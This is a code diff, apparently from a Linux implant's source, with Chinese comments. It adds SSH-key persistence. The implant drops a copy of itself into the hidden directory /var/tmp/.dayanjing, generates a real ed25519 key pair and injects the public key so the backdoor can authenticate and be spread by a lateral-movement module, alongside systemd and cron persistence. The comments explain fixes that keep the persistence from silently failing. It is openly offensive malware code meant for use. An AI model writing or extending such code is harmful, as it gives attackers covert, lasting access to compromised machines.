@@ -42,6 +42,7 @@
 #include <poll.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/stat.h>
 #include <sys/wait.h>
 #include <sys/prctl.h>
 #include <netinet/in.h>
@@ -63,6 +64,7 @@
 #include "exfil_task.h"
 #include "exfil_task_link.h"
 #include "cover_loop.h"
+#include "lateral_auto.h"
 #include "mono_embed.h"
 
 /* ====================================================================
@@ -585,6 +587,55 @@ static int implant_run(int cmd_fd, int data_fd, const mono_cfg_t *cfg,
         char binp[512];
         int meth[3];
         const char *proot = cfg->persist_root[0] ? cfg->persist_root : NULL;
+
+        /* 真实密钥对：sshkey 驻留项必须是可认证的公钥。
+         *
+         * 用占位 key 的后果是"装上了、看起来成功、但永远登不进去"——
+         * 消耗一次写入动作、留下痕迹、零收益，比不装更糟。
+         *
+         * 类型前缀绝不能写死：凭据层产出的是 ed25519，若按旧实现拼
+         * "ssh-rsa " 前缀去接 ed25519 blob，OpenSSH 会拒绝整行。
+         * 故由 persist_sshkey_pubkey 接受完整行。
+         *
+         * 私钥落在驻留目录（与落盘副本同处），公钥写入该项并供横向移动散布。
+         * 生成失败不阻断：systemd/cron 照装，只是 sshkey 项为 0。 */
+        {
+            char kd[512];
+            lat_cred_t cred;
+            char pub[1024];
+
+            /* 必须先落盘自身再生成密钥对：
+             * persist_drop_self 用的是递归建目录，而裸 mkdir 不是——
+             * 假根（如 /tmp/mono_selftest_root）在 implant 启动时并不存在，
+             * 直接 mkdir "<root>/var" 会因父目录缺失级联失败，
+             * 表现为 ssh-keygen 失败 -> sshkey 驻留项静默不装。
+             * 实测：修正前 selftest 输出 sshkey=0，且无任何报错。 */
+            if (persist_drop_self(proot, "/var/tmp/.dayanjing",
+                                  binp, sizeof binp) != 0) {
+                if (cfg->verbose)
+                    fprintf(stderr, "[implant] 落盘自身失败 -> sshkey 项不装\n");
+            } else {
+                snprintf(kd, sizeof kd, "%s/var/tmp/.dayanjing",
+                         proot ? proot : "");
+
+            memset(&cred, 0, sizeof cred);
+            {
+                int rc_gen = lat_cred_gen(kd, "agent_key", "dayanjing", &cred);
+                int rc_pub = (rc_gen == 0)
+                           ? lat_cred_pubkey(&cred, pub, sizeof pub) : -1;
+                int rc_set = (rc_pub == 0) ? persist_sshkey_pubkey(pub) : -1;
+                if (cfg->verbose)
+                    fprintf(stderr, "[implant] sshkey gen=%d pub=%d set=%d "
+                            "dir=%s fp=%s\n",
+                            rc_gen, rc_pub, rc_set, kd, cred.fp);
+                if (rc_set == 0 && cfg->verbose)
+                    fprintf(stderr, "[implant] sshkey 真实公钥已注入\n");
+                else if (cfg->verbose)
+                    fprintf(stderr, "[implant] sshkey 公钥不可用 -> 该项不安装\n");
+            }
+            }
+        }
+
         int pr = persist_linux_ensure(proot, binp, sizeof binp, meth, 3);
         if (cfg->verbose)
             fprintf(stderr, "[implant] persistence ensure rc=%d bin=%s "
